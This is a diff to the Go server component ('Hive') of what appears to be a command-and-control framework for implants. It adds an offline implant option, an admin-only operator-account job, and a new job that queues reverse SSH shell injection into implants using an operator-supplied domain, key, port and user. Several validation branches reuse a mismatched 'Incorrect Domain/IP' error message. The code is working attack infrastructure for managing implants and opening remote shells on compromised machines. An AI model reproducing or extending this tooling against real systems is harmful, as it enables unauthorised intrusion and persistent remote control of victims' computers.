@@ -12,9 +12,7 @@ package main
 
 import (
 
-	"log"
-	"os"
-	"bufio"
+
 	"os/exec"
 	"fmt"
 	"strings"
@@ -31,6 +29,7 @@ import (
 
 //CreateImplant
 type CreateImplant struct {
+	Offline string `json:"offline"`
     Name string   `json:"name"`
     Ttl string   `json:"ttl"`
     Resptime string   `json:"resptime"`
@@ -60,6 +59,8 @@ type InjectEmpire struct {
 type InjectRevSshShellBichito struct {
     Domain string   `json:"domain"`
     Sshkey string   `json:"sshkey"`
+    Port string   `json:"port"`
+    User string   `json:"user"`
 }
 
 
@@ -94,6 +95,12 @@ type DeleteStaging struct{
 //Implant Checking,future use for gather information of bot
 type BiChecking struct{
     Hostname string `json:"hostname"`
+}
+
+//Hive Operations
+type AddOperator struct {
+    Username string   `json:"username"`
+    Password string   `json:"password"`
 }
 
 
@@ -169,7 +176,7 @@ func jobProcessor(jobO *Job){
 					return
 				}
 
-				errI := createImplant(commandO.Name,commandO.Ttl,commandO.Resptime,commandO.Coms,commandO.ComsParams,commandO.PersistenceOsx,commandO.PersistenceOsxP,commandO.PersistenceWindows,commandO.PersistenceWindowsP,commandO.PersistenceLin,commandO.PersistenceLinP,commandO.Redirectors)
+				errI := createImplant(commandO.Offline,commandO.Name,commandO.Ttl,commandO.Resptime,commandO.Coms,commandO.ComsParams,commandO.PersistenceOsx,commandO.PersistenceOsxP,commandO.PersistenceWindows,commandO.PersistenceWindowsP,commandO.PersistenceLin,commandO.PersistenceLinP,commandO.Redirectors)
 				
 				if errI != ""{
 					removeImplant(commandO.Name)
@@ -182,7 +189,6 @@ func jobProcessor(jobO *Job){
 					return
 				}
 			case "deleteImplant":
-				fmt.Println("asdhjasdbjh31")
     			jsconcommanA := make([]DeleteImplant, 0)
     			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
     			errD := decoder.Decode(&jsconcommanA)
@@ -205,7 +211,7 @@ func jobProcessor(jobO *Job){
 					setJobStatusDB(jid,"Error:Hive-deleteImplant(Implant Not in DB)")
 					return
 				}
-				fmt.Println("asdhjasdbjh32")
+
 				err := removeImplant(commandO.Name)
 				if err != "Done"{
 					setJobStatusDB(jid,"Error")
@@ -413,7 +419,6 @@ func jobProcessor(jobO *Job){
 					setJobResultDB(jid,"Hive-createStaging(Command JSON Decoding Error)")
 					return
    				}
-
 
     			//Decode Staging by type and do formatting check
 				switch commandO.Stype{
@@ -627,6 +632,38 @@ func jobProcessor(jobO *Job){
 					setJobResultDB(jid,"Hive-createReport(Report "+commandO.Name+" created)")
 					return
 				}
+
+			case "addOperator":
+
+    			jsconcommanA := make([]AddOperator, 0)
+    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
+    			errD := decoder.Decode(&jsconcommanA)
+    			commandO := jsconcommanA[0]
+    			// Error Log
+    			if errD != nil {
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Hive-addOperator(Command JSON Decoding Error)")
+					return
+   				}
+
+   				//Debug
+   				//fmt.Println("CID:"+cid)
+   				//fmt.Println("Is admin??:"+isUserAdminDB(jobO.Cid))
+
+   				if isUserAdminDB(jobO.Cid) != "Yes"{
+   					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Hive-addOperator(Is not Admin User)")
+					return
+   				}
+
+
+   				err,_ := addUser(commandO.Username,commandO.Password)
+    			if err != "" {
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Hive-addOperator(Error adding new user to DB):"+err)
+					return
+   				}
+
 
 			default:
 				setJobStatusDB(jid,"Error")
@@ -970,29 +1007,6 @@ func jobProcessor(jobO *Job){
 					return
     			}
 
-    			/*
-    			vpsId,err3 := getStagingVpsIdbyNameDB(commandO.Staging)
-    			if err3 != nil {
-					setJobStatusDB(jid,"Error")
-					setJobResultDB(jid,"Implant-injectRevSshShell(Get Staging vpsId):"+err3.Error())
-        			return
-    			}
-
-
-    			vpsName,err4 := getVpsNamebyIdDB(vpsId)
-    			if err3 != nil {
-					setJobStatusDB(jid,"Error")
-					setJobResultDB(jid,"Implant-injectRevSshShell(Get Staging vpsName):"+err4.Error())
-        			return
-    			}
-
-    			sshkey,err5 := getVpsPemDB(vpsName)
-    			if err3 != nil {
-					setJobStatusDB(jid,"Error")
-					setJobResultDB(jid,"Implant-injectRevSshShell(Get Staging SSH Key):"+err5.Error())
-        			return
-    			}
-    			*/
 
     			///usr/local/STHive/stagings/%s/implantkey
 
@@ -1005,16 +1019,78 @@ func jobProcessor(jobO *Job){
     			}
 
     			//Debug
-    			fmt.Println("ImplantKey: "+string(sshkey) + "Domain: "+domain)
+    			//fmt.Println("ImplantKey: "+string(sshkey) + "Domain: "+domain)
 
     			//JSON Encode function params 
-    			revssshellhparams := InjectRevSshShellBichito{domain,string(sshkey)}
+    			revssshellhparams := InjectRevSshShellBichito{domain,string(sshkey),"22","anonymous"}
 				bufBP := new(bytes.Buffer)
 				json.NewEncoder(bufBP).Encode(revssshellhparams)
 				resultBP := bufBP.String()
 
 				jobO.Parameters = resultBP
 				
+
+				//Lock shared Slice
+    			jobsToProcess.mux.Lock()
+    			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+				jobsToProcess.mux.Unlock()
+				return
+
+			case "injectRevSshShellOffline":
+
+				//Get staging
+				//from staging: type,port,domain
+    			
+				
+    			jsconcommanA := make([]InjectRevSshShellBichito, 0)
+    			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
+    			errD := decoder.Decode(&jsconcommanA)
+    			commandO := jsconcommanA[0]
+    			// Error Log
+    			if errD != nil {
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
+					return
+    			}
+
+    			//WhiteList Client params
+
+    			if !domainsInputWhite(commandO.Domain){
+        			//ErrorLog
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
+        			return
+    			}
+
+    			if !rsaKeysInputWhite(commandO.Sshkey){
+        			//ErrorLog
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
+        			return
+    			}
+
+    			if !tcpPortInputWhite(commandO.Port){
+        			//ErrorLog
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
+        			return
+    			}
+
+    			if !namesInputWhite(commandO.User){
+        			//ErrorLog
+					setJobStatusDB(jid,"Error")
+					setJobResultDB(jid,"Implant-injectRevSshShellOffline(Incorrect Domain/IP)")
+        			return
+    			}
+
+    			//JSON Encode function params 
+    			revssshellhparams := InjectRevSshShellBichito{commandO.Domain,commandO.Sshkey,commandO.Port,commandO.User}
+				bufBP := new(bytes.Buffer)
+				json.NewEncoder(bufBP).Encode(revssshellhparams)
+				resultBP := bufBP.String()
+
+				jobO.Parameters = resultBP
+				jobO.Job = "injectRevSshShell"
 
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
@@ -1305,13 +1381,14 @@ func getStagingLog(stagingName string) (string,string){
 }
 
 
-func addUser(username string,password string) string{
+func addUser(username string,password string) (string,string){
 
 	genId := fmt.Sprintf("%s%s","C-",randomString(8))
 	err := addUserDB(genId,username,password)
-	if err != nil {return "User Exists!"}
-	return "Done!"
-
+	if err != nil {
+		return err.Error(),""
+	}
+	return "",""
 }
 
 
@@ -1321,7 +1398,7 @@ func addUser(username string,password string) string{
 //// Basic Built-In Server Console
 // 
 
-
+/*
 func console(){
 
 	var (
@@ -1369,3 +1446,5 @@ func console(){
 			os.Stdout.Write([]byte(prompt))
 		} 
 }
+
+*/
